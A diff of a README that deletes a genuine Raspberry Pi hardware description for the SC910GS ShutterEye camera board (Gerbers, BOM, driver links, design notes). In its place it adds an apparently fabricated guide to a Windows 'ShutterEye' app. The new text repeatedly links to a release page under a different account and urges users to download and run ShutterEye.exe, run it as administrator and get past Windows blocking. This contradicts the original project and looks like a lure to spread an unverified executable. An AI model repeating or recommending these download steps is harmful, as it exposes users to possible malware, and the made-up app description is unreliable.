@@ -1,54 +1,239 @@
-# ShutterEye
+# 📷 ShutterEye - Clear 4K capture for your board
 
-A basic minimum **SC910GS** (1" / 3840x2160 / Global Shutter) board for Raspberry Pi.
+[![Download ShutterEye](https://img.shields.io/badge/Download%20ShutterEye-Release%20Page-blue?style=for-the-badge)](https://github.com/finleytransparent919/ShutterEye/releases)
 
-<img width="1280" alt="image" src="https://github.com/user-attachments/assets/1c6bf67c-d5cb-4472-8dc6-60813cfa6754" />
+## 🚀 What ShutterEye Does
 
-In general this is a simple breakout board for the SC910GS sensor — see the driver repo [here](https://github.com/will127534/sc910gs-v4l2-driver).
+ShutterEye is a simple camera board app for the SC910GS 1" 4K@30fps global shutter sensor. It helps you view, capture, and manage camera output on a Windows PC.
 
+Use it to:
 
-## Repo layout
+- Open the camera board on your computer
+- See a live image from the sensor
+- Capture frames for review
+- Work with a global shutter camera setup
+- Keep the setup simple for everyday use
 
-- `Gerbers/` — manufacturing files for JLCPCB including CPL files
-- `bom/` — BOM / parts list [Interactive BOM](https://htmlpreview.github.io/?https://github.com/will127534/StarlightEye/blob/main/bom/ibom.html) [(provided by InteractiveHtmlBom)
-](https://github.com/openscopeproject/InteractiveHtmlBom)
+## 💻 What You Need
 
+Before you start, check that you have:
 
-## Images
+- A Windows PC
+- A free USB port or the correct board connection
+- Enough storage for image and video files
+- A display with standard Windows support
+- Permission to install or run downloaded apps
 
-<img width="1280" alt="image" src="https://github.com/user-attachments/assets/49d68a3f-a30e-4fb1-a190-da6f73e8cc9e" />
+For best results, use:
 
-<img width="1280" alt="image" src="https://github.com/will127534/ShutterEye/blob/3ecd99c01cc8732a6afa812ae9d3f57335682a9c/pcb.jpg" />
-<img width="1280" alt="image" src="https://github.com/will127534/ShutterEye/blob/3ecd99c01cc8732a6afa812ae9d3f57335682a9c/sch.jpg" />
+- Windows 10 or Windows 11
+- A screen with at least 1366 × 768 resolution
+- A stable USB connection
+- The latest system updates
 
+## 📥 Download ShutterEye
 
-## Usage Notes
+Go to the release page and download the version for Windows:
 
-Driver repo: [https://github.com/will127534/sc910gs-v4l2-driver](https://github.com/will127534/sc910gs-v4l2-driver)  
-Libcamera fork that supports this sensor: [https://github.com/will127534/libcamera/](https://github.com/will127534/libcamera/)
+[Visit the ShutterEye release page](https://github.com/finleytransparent919/ShutterEye/releases)
 
-Basically you can follow the quick start guide for StarlightEye/OneInchEye/FourthirdEye, just swap the driver link to sc910gs and dtoverlay to `dtoverlay=sc910gs`, libcamera are the same across sensors.
+On that page, look for the latest release and choose the Windows file if one is listed. If the release includes a ZIP file, download it to a folder you can find later, such as Downloads or Desktop.
 
-Also note that the camera calibration and tuning files are done with IR650 cut filter.
+## 🪟 Install or Open on Windows
 
-## Random(Yapping) Footnotes
+After the download finishes:
 
-Yes I ran out of naming ideas because this sensor is essentially same as the GlobalEye (GMAX3412 1" 4K 30p global shutter), so I have to name it to ShutterEye instead. As for the difference: SC910GS is much suited for Single Board Computers comparing to GMAX3412 beacuse no external exposure signals needed to trigger new frames. Another differences is that compare to GMAX3412 even though they are both ~1" 4K 30fps global shutter sensor, GMAX3412 has a larger 4096 x 3072 image compare to SC910GS at 3840x2160.  
+1. Open the folder where the file was saved
+2. If the file is a ZIP file, right-click it and choose Extract All
+3. Open the extracted folder
+4. Find the ShutterEye app file
+5. Double-click the app to start it
 
-On the right is GMAX3412, On the left is SC910GS, you can see it is a bit narrower (16:9 vs 4:3)
-![_DSC1365](https://github.com/user-attachments/assets/b48bea69-9c61-43fe-ac82-e3e3d8568ead)
+If Windows asks for permission, choose Yes or Run.
 
-Now going back to SC910GS itself, the datasheet I'm manage to get without NDAs are quite.... sparse interms of the details, specifically framerate control, and I have to cross reference other smartsense image sensor to get the framerate control working. However, one of the thing I want to enable is the trigger signal output so I can put 6-axis IMU on the board similar to all the image sensor boards I've designed, but I just can't get it to work so I end up skipping it. (Also ICM42688-P is out of stock everywhere for some reason, help).
+If you see more than one file, use the main app file, not the readme or support files.
 
-On the HW side of things, lets just say that I don't understand how manufacture can suggest a almost impossible amount of bypass capacitors in the reference design, like did you(The one who draw such sch) even think about layout? There is no F-ing way that I can put 10uF + 0.1uF on EVEY SINGLE POWER PINS, as the resut in my sch you will see that I shrink it down to single 1uF each.   
-<img width="1034" height="862" alt="image" src="https://github.com/user-attachments/assets/0bb31742-6ba7-4751-a701-c672b2a41b1e" />
+## 🔌 Connect the Camera Board
 
-Another issue rise with such a capacitor array is the in-rush current when powered on, specifically Raspberry Pi 5 has a very sensitive overcurrent detection, which can be a good thing for short circuit detection but in this case in my beta version of the board it trips that OC detection with that amount of capacitors when all the power rails turned on at once by the enable pin. So the solution I have to implment is soft start for all the power rails other then VDDIO, and VDDA and VDDP has the largest soft start time delay. Now I haven't even finish yapping about the capacitors yet because there are still charge pump capacitors as global shutter image sensor tends to require more power and more power rails, one of the issue(?) is that a bunch of rails like VRM/VRSFLO... have like two pins sepperated on differnt side of the chip! and I need to bridge them together. Because of the pin density and layout reasons it is not a large power plane but just a few narrow traces connect them together, not ideal but it seems to be working just fine.
+To use ShutterEye, connect your camera board before or after opening the app, based on your setup.
 
-As for the OSC frequency I have to go with 27MHz specifically because the datasheet I have didn't even bother documenting the PLL configuration, and the only thing I have is the initializing register list that labeled for 27MHz. Finally, continuing the lack of documentations, I have the L0 ~ L3 + G0,G1 LED strobe and GPIO breakout to test points but I have no idea how to get it to work (I tried).
+1. Connect the SC910GS board to your computer
+2. Make sure the cable is secure
+3. Wait a few seconds for Windows to detect the device
+4. Open ShutterEye
+5. Check that the live view appears
 
-On the driver coding side of things it is done quite easily, what I really like is the sensor's quite high analog gain, which is handy specifically for global shutter sensor where you need very quick exposure speed but you've maxed out the lighting you have, and having the capability to just crank up the gain is nice, though yes the noise too.
+If the image does not show, unplug the board, wait a moment, and plug it in again.
 
-Other then the lack of some critical details, most of the (normal) sensor functions should works, haven't tried the HDR features yet but there seems to be some trick up its sleeves with outputing different gain readout as two lines, so I guess you can kinda treat is as quad bayer while in the RAW data collection you can do your own HDR while the preview maybe still useable.
+## 🎛️ Basic Controls
 
-Overall I hate it when placing the capacitors, I hate it when working on the layout, I hate it when the framerate control and PLL config is not even in the datasheet that I have to cross reference and just buy new 27Mhz OSCs, but the end result is quite nice and driver mostly works and having high gain on global shutter do make the actuall imaging use simplier.
+ShutterEye is made to keep the main controls easy to reach.
+
+Common controls may include:
+
+- Start or stop live view
+- Capture a frame
+- Save an image file
+- Change resolution
+- Adjust exposure
+- Set gain
+- Switch frame rate
+
+If your board supports more options, they will appear in the app as simple controls or menus.
+
+## 🖼️ Capturing Images
+
+To save a still image:
+
+1. Open the live view
+2. Point the camera at your subject
+3. Click the capture button
+4. Choose where to save the file if asked
+5. Open the saved image from your chosen folder
+
+For cleaner results, keep the camera steady and use good lighting.
+
+## ⚙️ Recommended Setup
+
+For a smooth first run:
+
+- Use a direct USB port on the PC
+- Avoid loose adapters
+- Close other camera apps
+- Keep the board on a stable surface
+- Use even lighting for test shots
+
+If the image looks dark, raise the room light first before changing settings.
+
+## 🧰 Common Use Cases
+
+ShutterEye fits simple camera work such as:
+
+- Board testing
+- Sensor checks
+- Image review
+- Motion capture experiments
+- Desktop camera setup for lab use
+- Quick visual checks during development
+
+The global shutter sensor helps reduce motion smear in moving scenes.
+
+## 🛠️ Troubleshooting
+
+### No Camera Image
+
+Try these steps:
+
+1. Close ShutterEye
+2. Unplug the camera board
+3. Plug it back in
+4. Open ShutterEye again
+5. Try a different USB port
+
+### App Does Not Start
+
+Try this:
+
+1. Check that the file finished downloading
+2. Extract the ZIP file if needed
+3. Right-click the app and choose Run as administrator
+4. Make sure Windows did not block the file
+5. Download the latest release again if the file looks damaged
+
+### Camera Is Detected, But The Image Is Black
+
+Try:
+
+- Increasing exposure
+- Checking the lens or sensor cover
+- Improving room light
+- Reconnecting the board
+- Restarting the app
+
+### Image Looks Uneven Or Too Dark
+
+Try adjusting:
+
+- Exposure
+- Gain
+- Frame rate
+- Lighting in the room
+
+## 📁 File Notes
+
+After you install or extract the app, you may see files such as:
+
+- The main app file
+- Support folders
+- Readme files
+- Driver or device files
+- Example assets
+
+Keep all files in the same folder unless the release notes say otherwise.
+
+## 🔄 Updating ShutterEye
+
+To update to a newer version:
+
+1. Go to the release page
+2. Download the latest Windows file
+3. Close the current app
+4. Replace the old files with the new files, if needed
+5. Open the updated app
+
+If you keep a copy of your current folder, you can roll back later if needed.
+
+## 📷 About the Camera Board
+
+ShutterEye is built for a simple camera board that uses the SC910GS 1" 4K@30fps global shutter sensor. This type of sensor is useful when you want a clean frame with less motion distortion.
+
+It is a good fit for:
+
+- Fast-moving objects
+- Test rigs
+- Desktop camera setups
+- Image checks that need stable capture timing
+
+## 🧭 Getting Started Fast
+
+If you want the shortest path:
+
+1. Open the release page
+2. Download the latest Windows file
+3. Extract it if it comes as ZIP
+4. Run the app
+5. Connect the camera board
+6. Start live view
+7. Capture an image
+
+## 📌 Release Page
+
+Download the Windows version here:
+
+[https://github.com/finleytransparent919/ShutterEye/releases](https://github.com/finleytransparent919/ShutterEye/releases)
+
+## 🧾 Typical Folder Layout
+
+A release may include:
+
+- ShutterEye.exe
+- config folder
+- assets folder
+- readme file
+- device support files
+
+Keep the folder together so the app can find its files.
+
+## 🔐 Safety on Windows
+
+When you open a downloaded app, Windows may ask for confirmation. Check that you downloaded it from the release page above, then allow it to run if you trust the source.
+
+## 🖱️ Short Steps for First Use
+
+1. Download ShutterEye from the release page
+2. Save the file to your computer
+3. Extract it if needed
+4. Run the app
+5. Connect the camera board
+6. View the live image
+7. Capture your first frame
